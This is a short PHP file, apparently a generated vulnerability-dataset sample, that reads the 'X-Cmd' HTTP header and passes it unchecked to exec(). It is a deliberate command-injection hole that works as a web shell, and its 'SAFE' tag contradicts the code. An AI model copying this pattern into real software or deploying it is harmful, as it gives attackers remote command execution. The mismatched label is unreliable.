<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_AKE; SKELETON=S3; KEY=cmd; SINK=B2; VAR=v0197; HDR_NAME=X-Cmd */
function SINK_B2($command){
    $output = [];
    exec($command, $output);
    print_r($output);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = array_key_exists("X-Cmd", $h) ? (string)$h["X-Cmd"] : "";
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B2($x);
};
$out = $f($inp);
echo (string)($out);
?>
